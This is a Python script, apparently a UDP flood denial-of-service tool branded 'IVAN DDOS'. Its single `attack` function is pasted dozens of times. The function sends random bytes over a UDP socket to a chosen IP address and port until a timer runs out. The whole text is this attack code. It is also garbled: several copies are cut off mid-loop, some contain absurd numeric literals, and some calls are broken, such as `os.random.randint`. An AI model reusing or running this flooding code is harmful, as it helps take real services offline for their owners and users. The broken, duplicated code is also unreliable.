    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
